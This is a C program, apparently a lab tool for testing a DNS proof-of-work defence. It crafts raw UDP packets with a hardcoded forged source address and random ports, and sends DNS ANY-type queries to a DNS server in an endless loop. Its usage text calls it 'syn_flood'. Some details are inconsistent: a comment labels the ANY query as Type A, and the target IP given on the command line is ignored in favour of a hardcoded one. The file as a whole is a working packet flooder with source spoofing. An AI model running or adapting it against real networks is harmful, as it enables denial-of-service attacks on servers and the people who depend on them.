#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE 1500
#define DNS_PORT 53
#define DEFAULT_SRC_IP "10.0.5.1"
#define DEFAULT_DST_IP "10.0.1.1"
#define MAX_ITERS 1500
#define POW_THRESHOLD 4286377360 //iters = 500, can change

#if !defined (get16bits)
#define get16bits(d) ((((unsigned long)(((const unsigned char *)(d))[1])) << 8)\
                       +(unsigned long)(((const unsigned char *)(d))[0]) )
#endif

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t udp_length;
};

struct dns_header {
    uint16_t tid;
    uint16_t flags;
    uint16_t nqueries;
    uint16_t nanswers;
    uint16_t nauth;
    uint16_t nother;
} __attribute__((packed));

struct message_digest {
    unsigned long saddr;
    unsigned long daddr;
    unsigned short sport;
    unsigned short dport;
    unsigned short tid;
};

static __inline unsigned long SuperFastHash (const char* data, int len) {
	uint32_t hash = len, tmp;
	int rem;

	if (len <= 0 || data == NULL) return 0;

	rem = len & 3;
	len >>= 2;

	/* Main loop */
	for (;len > 0; len--) {
		hash  += get16bits (data);
		tmp    = (get16bits (data+2) << 11) ^ hash;
		hash   = (hash << 16) ^ tmp;
		data  += 2*sizeof (uint16_t);
		hash  += hash >> 11;
	}

	/* Handle end cases */
	switch (rem) {
    	case 3: hash += get16bits (data);
            hash ^= hash << 16;
            hash ^= ((signed char)data[sizeof (uint16_t)]) << 18;
            hash += hash >> 11;
            break;
    	case 2: hash += get16bits (data);
            hash ^= hash << 11;
            hash += hash >> 17;
            break;
    	case 1: hash += (signed char)*data;
            hash ^= hash << 10;
            hash += hash >> 1;
  	}

	/* Force "avalanching" of final 127 bits */
	hash ^= hash << 3;
	hash += hash >> 5;
	hash ^= hash << 4;
	hash += hash >> 17;
	hash ^= hash << 25;
	hash += hash >> 6;

	return hash;
}

static __inline unsigned long dns_hash(struct message_digest* digest) {
    return SuperFastHash((const char *)digest, sizeof(struct message_digest));
}

static __inline unsigned short do_dns_pow(struct iphdr* iph, struct udphdr* udph, struct dns_header* dnsh) {
    unsigned long hash = 0;
    unsigned long best_hash = 0;
    unsigned short hash_iters = 0;
        // unsigned long nonce = bp, __u32 old_ack_seqf_get_prandom_u32();
    unsigned long nonce = rand() % 0xffff;
        // unsigned long nonce = (unsigned long)(e->start_ts & 0xffffffff);
    unsigned long best_nonce = nonce;

    struct message_digest digest;
    digest.saddr = iph->saddr;
    digest.daddr = iph->daddr;
    digest.sport = udph->source;
    digest.dport = udph->dest;
    digest.tid = dnsh->tid;

    if (POW_THRESHOLD > 0) {
        #pragma unroll
        for (unsigned short i=0; i<MAX_ITERS; i++) {
	    nonce = (nonce + 1) % 0xffff;
            digest.tid = htons(nonce);
            hash = dns_hash(&digest);
	    //printf("%lu\n", hash);
            hash_iters += 1;
            if (hash > best_hash) {
                best_nonce = nonce;
                best_hash = hash;
                if (best_hash >= POW_THRESHOLD) {
                    break;
                }
            }
        }
        dnsh->tid = htons(best_nonce);
    }
    return hash_iters;
}

// Internet checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

void encode_dns_query(char *buf, const char *hostname, int *query_len) {
    char *p = buf;
    const char delim[2] = ".";
    char tmp[64];
    strcpy(tmp, hostname);

    char *token = strtok(tmp, delim);
    while (token != NULL) {
        size_t len = strlen(token);
        *p++ = len;
        memcpy(p, token, len);
        p += len;
        token = strtok(NULL, delim);
    }

    *p++ = 0x00;          // End of host name
    *p++ = 0x00; *p++ = 0xff; // Type A
    *p++ = 0x00; *p++ = 0x01; // Class IN

    *query_len = p - buf;
}

uint32_t random_ipv4(void) {
    uint32_t addr;
    do {
        addr = rand();
    } while ((addr & 0xff) == 0 || (addr & 0xff) >= 224); // basic filter
    return addr;
}

uint16_t random_port(void) {
    return (rand() % (65535 - 1024)) + 1024;
}

int main(int argc, char *argv[]) {
    srand(time(NULL));

    if (argc <= 1) {
	printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
        exit(1);
    }
    
    char *src_ip_str = DEFAULT_SRC_IP;
    char *dst_ip_str = argv[1];
    
    // printf("set ips\n");

    // if (argc > 1) {
    //     strcpy(dst_ip_str, argv[0]);
    // } else {
    //     printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
    //     exit(1);
    // }
    // printf("set auth ips\n");

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    char datagram[MAX_PACKET_SIZE];
    memset(datagram, 0, MAX_PACKET_SIZE);

    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
    struct dns_header *dnsh = (struct dns_header *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
    char *dns_query = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header));
    struct pseudo_header psh;
    int query_len;
    encode_dns_query(dns_query, "www.google.com", &query_len);

    // DNS Header
    dnsh->tid = htons(0x1234);
    dnsh->flags = htons(0x0100); // standard query
    dnsh->nqueries = htons(1);
    dnsh->nanswers = 0;
    dnsh->nauth = 0;
    dnsh->nother = 0;

    int dns_size = sizeof(struct dns_header) + query_len;
    int udp_len = sizeof(struct udphdr) + dns_size;
    int ip_len = sizeof(struct iphdr) + udp_len;

    // Destination
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(DNS_PORT);
    sin.sin_addr.s_addr = inet_addr(DEFAULT_DST_IP);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(ip_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(DEFAULT_SRC_IP);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));

    udph->source = htons(random_port());
    udph->dest = htons(DNS_PORT);
    udph->len = htons(udp_len);
    udph->check = 0;

    psh.src = iph->saddr;
    psh.dst = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(udp_len);

    //int psize = sizeof(struct pseudo_header) + udp_len;
    //char *pseudogram = malloc(psize);
    //memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    //memcpy(pseudogram + sizeof(struct pseudo_header), udph, udp_len);
    //udph->check = csum((unsigned short *)pseudogram, psize);
    //free(pseudogram);

    while (1) {
	dnsh->tid = htons(rand() % (0xffff));
	//struct timeval start, end;
	//gettimeofday(&start, NULL);
	//uint32_t iters = (uint32_t) do_dns_pow(iph, udph, dnsh);
	//gettimeofday(&end, NULL);
	//long elapsed = (end.tv_sec - start.tv_sec) * 1000000L + (end.tv_usec - start.tv_usec);
	//printf("PoW iterations: %u\n", iters);
	//uint32_t psize = sizeof(struct pseudo_header) + udp_len;
        //char *pseudogram = malloc(psize);
        //memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        //memcpy(pseudogram + sizeof(struct pseudo_header), udph, udp_len);
        //udph->check = csum((unsigned short *)pseudogram, psize);
	//udph->check = 0;
	//free(pseudogram);
	udph->source = htons(random_port());
	uint32_t iters = (uint32_t) do_dns_pow(iph, udph, dnsh);
	//printf("PoW iterations: %u\n", iters);
	//unsigned long hash = 0;
        //struct message_digest digest;
        //digest.saddr = iph->saddr;
        //digest.daddr = iph->daddr;
        //digest.sport = udph->source;
        //digest.dport = udph->dest;
        //digest.tid = dnsh->tid;
        //hash = dns_hash(&digest);
	//printf("hash: %lu", hash);
	udp_len = sizeof(struct udphdr) + sizeof(struct dns_header) + query_len;
	udph->len = htons(udp_len);
	ip_len = sizeof(struct iphdr) + udp_len;
	iph->tot_len = htons(ip_len);
	iph->check = 0;
	iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));
	int psize = sizeof(struct pseudo_header) + udp_len;
	char *pseudogram = malloc(psize);
	if (!pseudogram) {
	    perror("malloc");
	    exit(1);
	}
	
	memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), udph, udp_len);
	udph->check = 0;  // Set to 0 before computing
	//udph->check = csum((unsigned short *)pseudogram, psize);
	free(pseudogram);
	//digest.saddr = iph->saddr;
        //digest.daddr = iph->daddr;
        //digest.sport = udph->source;
        //digest.dport = udph->dest;
        //digest.tid = dnsh->tid;
        //hash = dns_hash(&digest);
        //printf("hash before sending: %lu", hash);
        if (sendto(sock, datagram, ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto");
        } else {
            char src_buf[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &iph->saddr, src_buf, sizeof(src_buf));
            // printf("Sent packet from %s:%d with TID %x\n", src_buf, udph->source, dnsh->tid);
        }

    }

    close(sock);
    return 0;
}

